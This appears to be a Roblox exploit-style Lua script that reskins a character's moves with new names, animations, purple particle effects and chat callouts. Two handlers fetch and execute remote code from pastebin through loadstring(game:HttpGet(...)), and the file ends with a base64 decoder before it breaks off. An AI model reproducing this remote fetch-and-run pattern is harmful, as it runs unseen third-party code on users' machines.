-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

-- Local Player
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Color tweening function
local function tweenColor(imageLabel, startColor, endColor, duration)
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true)
    local goal = {ImageColor3 = endColor}
    local tween = TweenService:Create(imageLabel, tweenInfo, goal)
    tween:Play()
end

-- GUI and color adjustment function
local function updateBarColor()
    -- Find the ScreenGui on the screen
    local screenGui = playerGui:FindFirstChild("ScreenGui")
    if not screenGui then return end

    -- Find the MagicHealth Frame
    local magicHealthFrame = screenGui:FindFirstChild("MagicHealth")
    if not magicHealthFrame then return end

    -- Find the Health Frame
    local healthFrame = magicHealthFrame:FindFirstChild("Health")
    if not healthFrame then return end

    -- Find the Bar Frame
    local barFrame = healthFrame:FindFirstChild("Bar")
    if not barFrame then return end

    -- Find the ImageLabel with ImageColor3 property inside the Bar Frame
    local imageLabel = barFrame:FindFirstChild("Bar")
    if not imageLabel or not imageLabel:IsA("ImageLabel") then return end

    -- Set initial color to dark red
    imageLabel.ImageColor3 = Color3.fromRGB(138, 43, 226) -- purple

    -- Smooth transition from dark red to none
    tweenColor(imageLabel, Color3.fromRGB(138, 43, 226), Color3.fromRGB(138, 43, 226), 2)
end

-- Check the GUI again when the character resets
local function onCharacterAdded(character)
    -- Update the GUI
    updateBarColor()
end

-- Check the local player's character
local function onPlayerAdded()
    local character = player.Character or player.CharacterAdded:Wait()
    onCharacterAdded(character)

    -- Check again when the character changes
    player.CharacterAdded:Connect(onCharacterAdded)
end

-- Check when the player is added
Players.PlayerAdded:Connect(onPlayerAdded)
if player then
    onPlayerAdded()
end
local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("1").Base

local ToolName = baseButton.ToolName


ToolName.Text = "Black Flash"


local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("2").Base

local ToolName = baseButton.ToolName


ToolName.Text = "Speedy Barrage"


local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("3").Base

local ToolName = baseButton.ToolName


ToolName.Text = "Focus Strike"


local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("4").Base

local ToolName = baseButton.ToolName


ToolName.Text = "Crush Soul"


local Players = game:GetService("Players")

local player = Players.LocalPlayer

local playerGui = player:WaitForChild("PlayerGui")


local function findGuiAndSetText()

    local screenGui = playerGui:FindFirstChild("ScreenGui")

    if screenGui then

        local magicHealthFrame = screenGui:FindFirstChild("MagicHealth")

        if magicHealthFrame then

            local textLabel = magicHealthFrame:FindFirstChild("TextLabel")

            if textLabel then

                textLabel.Text = "ESSENCE OF THE SOUL"

            end

        end

    end

end


playerGui.DescendantAdded:Connect(findGuiAndSetText)

findGuiAndSetText()


local animationId = 10468665991


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18249294373"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(1)

local fx5 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmBurst.Attachment:Clone()
fx5.Parent = game.Players.LocalPlayer.Character["Right Arm"]
for _, child in ipairs(fx5:GetChildren()) do
    if child:IsA("ParticleEmitter") then
child.Color = ColorSequence.new(Color3.fromRGB(160, 32, 240)) -- Set color to purple
        child:Emit(7) -- Emit 20 particles
    end
end

 task.wait(0.5)
local fx5 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmBurst.Attachment:Clone()
fx5.Parent = game.Players.LocalPlayer.Character["Right Arm"]
for _, child in ipairs(fx5:GetChildren()) do
    if child:IsA("ParticleEmitter") then
        child:Emit(15) -- Emit 20 particles
    end
end

task.wait(0.1)
local final1 = game.ReplicatedStorage.Resources.KJEffects["KJWallCombo"].FinalImpact.Attachment:Clone()
final1.Parent = game.Players.LocalPlayer.Character["Head"]
for _, child in ipairs(final1:GetChildren()) do
    if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
        child:Emit(10) -- Emit 20 particles
    end
end
task.wait(0.1)
local hit1 = game.ReplicatedStorage.Resources.KJEffects["lastkick"].Attachment:Clone()
hit1.Parent = game.Players.LocalPlayer.Character["HumanoidRootPart"]
    for _, child in ipairs(hit1:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(5) -- Emit 20 particles
        end
    end      
    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 10466974800


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()
                        local red4 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].EyeEmit:Clone()
red4.Parent = game.Players.LocalPlayer.Character["Head"]
    for _, child in ipairs(red4:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a 
child.Color = ColorSequence.new(Color3.fromRGB(160, 32, 240)) -- Set color to purple
            child:Emit(20) -- Emit 20 particles
        end
        end
                
end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://15090141089"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(6)

task.wait(1.7)
local AnimAnim2 = Instance.new("Animation")

AnimAnim2.AnimationId = "rbxassetid://15957361339"

local Anim2 = Humanoid:LoadAnimation(AnimAnim2)


local startTime = 0


Anim:Stop()

Anim2:Play()

Anim2:AdjustSpeed(0)

Anim2.TimePosition = startTime

Anim2:AdjustSpeed(200)

    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 10471336737


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()
local fx5 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmBurst.Attachment:Clone()
fx5.Parent = game.Players.LocalPlayer.Character["Right Arm"]
for _, child in ipairs(fx5:GetChildren()) do
    if child:IsA("ParticleEmitter") then
child.Color = ColorSequence.new(Color3.fromRGB(160, 32, 240)) -- Set color to purple
        child:Emit(3) -- Emit 20 particles
    end
end
end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18440389930"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 1.3


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(1)
task.wait(1)
local AnimAnim2 = Instance.new("Animation")

AnimAnim2.AnimationId = "rbxassetid://15957361339"

local Anim2 = Humanoid:LoadAnimation(AnimAnim2)


local startTime = 0


Anim:Stop()

Anim2:Play()

Anim2:AdjustSpeed(0)

Anim2.TimePosition = startTime

Anim2:AdjustSpeed(200)
    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 12510170988


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://14003607057"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0.2


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(1)

task.wait(0.4)
local launch1 = game.ReplicatedStorage.Resources.KJEffects["launchup"].launchything:Clone()
            launch1.Parent = game.Players.LocalPlayer.Character["Torso"]
                for _, child in ipairs(launch1:GetChildren()) do
                    if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
                        child:Emit(5) -- Emit 20 particles
                    end
                end
    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)

local animationId = 11343318134


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()
local workspace = game.Workspace
 Players = game:GetService("Players")
 local speaker = Players.LocalPlayer
 workspace.CurrentCamera:remove()
     wait(.1)
     workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
     workspace.CurrentCamera.CameraType = "Custom"
     speaker.CameraMinZoomDistance = 0.5
     speaker.CameraMaxZoomDistance = 400
     speaker.CameraMode = "Classic"
     speaker.Character.Head.Anchored = false
end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://17097146599"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0

Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(0.2)

message = "無為変形||idle Transfiguration"
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")

task.wait(0.1)
local fx7 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmFX:Clone()
fx7.Parent = game.Players.LocalPlayer.Character["Right Arm"]
for _, child in ipairs(fx7:GetChildren()) do
    if child:IsA("ParticleEmitter") then
child.Color = ColorSequence.new(Color3.fromRGB(160, 32, 240)) -- Set color to purple
        child:Emit(20) -- Emit 1 particle
    end
end

task.wait(7.1)
fx7:Destroy()

    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)

local animationId = 15955393872 ---wall combo


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()


end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18897119503"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(0.7)

task.wait(1.6)
local AnimAnim2 = Instance.new("Animation")

AnimAnim2.AnimationId = "rbxassetid://18249294373"

local Anim2 = Humanoid:LoadAnimation(AnimAnim2)


local startTime = 0


Anim:Stop()

Anim2:Play()

Anim2:AdjustSpeed(0)

Anim2.TimePosition = startTime

Anim2:AdjustSpeed(0.6)
task.wait(0.7)
local fx5 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmBurst.Attachment:Clone()
fx5.Parent = game.Players.LocalPlayer.Character["Right Arm"]
for _, child in ipairs(fx5:GetChildren()) do
    if child:IsA("ParticleEmitter") then
child.Color = ColorSequence.new(Color3.fromRGB(160, 32, 240)) -- Set color to purple
        child:Emit(9) -- Emit 20 particles
    end
end

task.wait(0.1)
local stoic2 = game.ReplicatedStorage.Resources.StoicBomb["Main"].Part.Attachment:Clone()
stoic2.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(stoic2:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a 
child.Color = ColorSequence.new(Color3.fromRGB(160, 32, 240)) -- Set color to purple
            child:Emit(1) -- Emit 20 particles
        end
        end

task.wait(0.1)
local boom3 = game.ReplicatedStorage.Resources.KJEffects["stoic bomb boom entrance"].smok:Clone()
boom3.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(boom3:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(15) -- Emit 20 particles
        end
    end
    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)

local animationId = 12983333733 --punch


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18249294373"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(0.1)



task.wait(4)
local fx5 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmBurst.Attachment:Clone()
fx5.Parent = game.Players.LocalPlayer.Character["Right Arm"]
for _, child in ipairs(fx5:GetChildren()) do
    if child:IsA("ParticleEmitter") then
child.Color = ColorSequence.new(Color3.fromRGB(160, 32, 240)) -- Set color to purple
        child:Emit(7) -- Emit 20 particles
    end
end

 task.wait(0.8)
local fx5 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmBurst.Attachment:Clone()
fx5.Parent = game.Players.LocalPlayer.Character["Right Arm"]
for _, child in ipairs(fx5:GetChildren()) do
    if child:IsA("ParticleEmitter") then
        child:Emit(15) -- Emit 20 particles
    end
end

task.wait(0.5)
local final1 = game.ReplicatedStorage.Resources.KJEffects["KJWallCombo"].FinalImpact.Attachment:Clone()
final1.Parent = game.Players.LocalPlayer.Character["Head"]
for _, child in ipairs(final1:GetChildren()) do
    if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
        child:Emit(7) -- Emit 20 particles
    end
end
task.wait(0.1)
local hit1 = game.ReplicatedStorage.Resources.KJEffects["lastkick"].Attachment:Clone()
hit1.Parent = game.Players.LocalPlayer.Character["HumanoidRootPart"]
    for _, child in ipairs(hit1:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(3) -- Emit 20 particles
        end
    end
      
task.wait(0.1)
local final2 = game.ReplicatedStorage.Resources.KJEffects["KJWallCombo"].FinalImpact.Origin:Clone()
        final2.Parent = game.Players.LocalPlayer.Character["Right Arm"]
            for _, child in ipairs(final2:GetChildren()) do
                if child:IsA("ParticleEmitter") then -- Check if the child is a 
                    child:Emit(4) -- Emit 20 particles
                end
            end
    end

end
humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 13927612951 ---omi


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end

message = "DOMAIN EXPANSION:SELF-EMBODIMENT OFTION PERFECTION"
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")

local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://15503060232"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim:AdjustSpeed(0.4)

task.wait(0.1)
loadstring(game:HttpGet('https://pastebin.com/raw/xD8QFRUT'))()

task.wait(5.8)
local AnimAnim2 = Instance.new("Animation")

AnimAnim2.AnimationId = "rbxassetid://18450685221"

local Anim2 = Humanoid:LoadAnimation(AnimAnim2)


local startTime = 0.8


Anim:Stop()

Anim2:Play()

Anim2:AdjustSpeed(0)

Anim2.TimePosition = startTime

Anim2:AdjustSpeed(0.5)
    end

end
humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 13929182266 --after the omi


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end

local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18450697195"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim:AdjustSpeed(0.5)

    end

end
humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 12447707844 --ult


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18450685221"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(1)

task.wait(1.2)
local AnimAnim2 = Instance.new("Animation")

AnimAnim2.AnimationId = "rbxassetid://12342141464"

local Anim2 = Humanoid:LoadAnimation(AnimAnim2)


local startTime = 3.7


Anim:Stop()

Anim2:Play()

Anim2:AdjustSpeed(0)

Anim2.TimePosition = startTime

Anim2:AdjustSpeed(1.1)

task.wait(0.3)
local wow1 = game.ReplicatedStorage.Resources.Dragon["Complete"].Part.Debri:Clone()
wow1.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(wow1:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a
child.Color = ColorSequence.new(Color3.fromRGB(0, 255, 0)) -- Set color to green
            child:Emit(6) -- Emit 20 particles
        end
    end

task.wait(0.1)
local wow1 = game.ReplicatedStorage.Resources.Dragon["Complete"].Part.Debri:Clone()
wow1.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(wow1:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a 
child.Color = ColorSequence.new(Color3.fromRGB(160, 32, 240)) -- Set color to purple
            child:Emit(6) -- Emit 20 particles
        end
    end

task.wait(0.1)
message = "I Truly Am A Curse!!!"
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")

task.wait(0.1)
loadstring(game:HttpGet('https://pastebin.com/raw/8q38wvvK'))()
    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 10479335397 ---for dash


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18903642853"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 3.6


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(1.4)


delay(1.2, function()

    Anim:Stop()

end)


    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 10470104242 ---down slam


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18464356233"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


wait(0.2)

Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(3.4)
local boom3 = game.ReplicatedStorage.Resources.KJEffects["stoic bomb boom entrance"].smok:Clone()
boom3.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(boom3:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(10) -- Emit 20 particles
        end
    end
task.wait(0.1)
local boom1 = game.ReplicatedStorage.Resources.KJEffects["spinnerthing"].spinningpartysmoke:Clone()
boom1.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(boom1:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(30) -- Emit 20 particles
        end
    end
    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local Players = game:GetService("Players")

local player = Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local animationIdsToStop = {

    [10469493270] = true,

    [10469630950] = true,

    [10469639222] = true,

    [10469643643] = true,

}


local replacementAnimations = {

    ["10469643643"] = "rbxassetid://13378708199",

    ["10469639222"] = "rbxassetid://17889290569",

    ["10469630950"] = "rbxassetid://13532600125",

    ["10469493270"] = "rbxassetid://17889458563",

}


local queue = {}

local isAnimating = false


local function playReplacementAnimation(animationId)

    if isAnimating then

        table.insert(queue, animationId)

        return

    end

   

    isAnimating = true

    local replacementAnimationId = replacementAnimations[tostring(animationId)]

    if replacementAnimationId then

        local AnimAnim = Instance.new("Animation")

        AnimAnim.AnimationId = replacementAnimationId

        local Anim = humanoid:LoadAnimation(AnimAnim)

        Anim:Play()

       

        Anim.Stopped:Connect(function()

            isAnimating = false

            if #queue > 0 then

                local nextAnimationId = table.remove(queue, 1)

                playReplacementAnimation(nextAnimationId)

            end

        end)

    else

        isAnimating = false

    end

end


local function stopSpecificAnimations()

    for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do

        local animationId = tonumber(track.Animation.AnimationId:match("%d+"))

        if animationIdsToStop[animationId] then

            track:Stop()

        end

    end

end


local function onAnimationPlayed(animationTrack)

    local animationId = tonumber(animationTrack.Animation.AnimationId:match("%d+"))

    if animationIdsToStop[animationId] then

        stopSpecificAnimations()

        animationTrack:Stop()

       

        local replacementAnimationId = replacementAnimations[tostring(animationId)]

        if replacementAnimationId then

            playReplacementAnimation(animationId)

        end

    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoidRootPart = character:WaitForChild("HumanoidRootPart")


local function onBodyVelocityAdded(bodyVelocity)

    if bodyVelocity:IsA("BodyVelocity") then

        bodyVelocity.Velocity = Vector3.new(bodyVelocity.Velocity.X, 0, bodyVelocity.Velocity.Z)

    end

end


character.DescendantAdded:Connect(onBodyVelocityAdded)


for _, descendant in pairs(character:GetDescendants()) do

    onBodyVelocityAdded(descendant)

end


player.CharacterAdded:Connect(function(newCharacter)

    character = newCharacter

    humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    character.DescendantAdded:Connect(onBodyVelocityAdded)

   

    for _, descendant in pairs(character:GetDescendants()) do

        onBodyVelocityAdded(descendant)

    end

end)
local newAnimationId = "18450685221"
local animationIds = { "12447707844" }

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local playerGui = player:WaitForChild("PlayerGui")
local RunService = game:GetService("RunService")
local SoundService = game:GetService("SoundService")

local cinematicGui = Instance.new("ScreenGui")
cinematicGui.Name = "CinematicGui"
cinematicGui.Parent = playerGui

local function createMangaText(parent, text)
    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Size = UDim2.new(0, 150, 0, 350) 
    billboardGui.AlwaysOnTop = true
    billboardGui.LightInfluence = 0
    billboardGui.Parent = parent

    local borderFrame = Instance.new("Frame")
    borderFrame.Size = UDim2.new(1, 0, 1, 0)
    borderFrame.BackgroundColor3 = Color3.new(1, 1, 1) 
    borderFrame.BorderSizePixel = 5 
    borderFrame.BorderColor3 = Color3.new(0, 0, 0)  
    borderFrame.Parent = billboardGui

    local shadowLabel = Instance.new("TextLabel")
    shadowLabel.Size = UDim2.new(1, -20, 1, -20) 
    shadowLabel.Position = UDim2.new(0.5, 2, 0.5, 2) 
    shadowLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    shadowLabel.BackgroundTransparency = 1
    shadowLabel.Text = text
    shadowLabel.Font = Enum.Font.Arcade
    shadowLabel.TextSize = 28
    shadowLabel.TextColor3 = Color3.new(0, 0, 0)  
    shadowLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    shadowLabel.TextStrokeTransparency = 0.7
    shadowLabel.TextWrapped = true
    shadowLabel.Parent = borderFrame

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, -20, 1, -20) 
    textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
    textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = text
    textLabel.Font = Enum.Font.Arcade
    textLabel.TextSize = 28
    textLabel.TextColor3 = Color3.new(0, 0, 0) 
    textLabel.TextStrokeColor3 = Color3.new(1, 1, 1)
    textLabel.TextStrokeTransparency = 0
    textLabel.TextWrapped = true
    textLabel.Parent = borderFrame

    return billboardGui
end

local leftText = createMangaText(cinematicGui, "I Truly Am A Curse")
local rightText = createMangaText(cinematicGui, "LETS KICK IT UP NOTCH!")

leftText.Enabled = false
rightText.Enabled = false

local function updateTextOrientation()
    local head = character:WaitForChild("Head")
    leftText.Adornee = head
    rightText.Adornee = head

    leftText.StudsOffset = Vector3.new(-6, -2, 0)  
    rightText.StudsOffset = Vector3.new(6, -2, 0) 
end

RunService.RenderStepped:Connect(updateTextOrientation)

local soundEffect = Instance.new("Sound")
soundEffect.SoundId = "rbxassetid://8098966252"
soundEffect.Name = "NightmodeSound"
soundEffect.Volume = 15  
soundEffect.Parent = SoundService

local function showTextsAndPlaySound()
    leftText.Enabled = true
    rightText.Enabled = true

    soundEffect:Play()

    task.delay(2, function()
        leftText.Enabled = false
        rightText.Enabled = false
    end)
end

local function stopAnimations()
    for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
        if table.find(animationIds, track.Animation.AnimationId:match("%d+$")) then
            track:Stop()
        end
    end
end

local function playNewAnimation()
    local animation = Instance.new("Animation")
    animation.AnimationId = "rbxassetid://" .. newAnimationId

    local animationTrack = humanoid:LoadAnimation(animation)
    animationTrack:Play()
    animationTrack:AdjustSpeed(1)
end

local function onAnimationTrackStarted(track)
    if table.find(animationIds, track.Animation.AnimationId:match("%d+$")) then
        stopAnimations()
        playNewAnimation()
        showTextsAndPlaySound()
    end
end

humanoid.AnimationPlayed:Connect(onAnimationTrackStarted)
-- b64 decode
local function decodeBase64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f = '',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- sgui
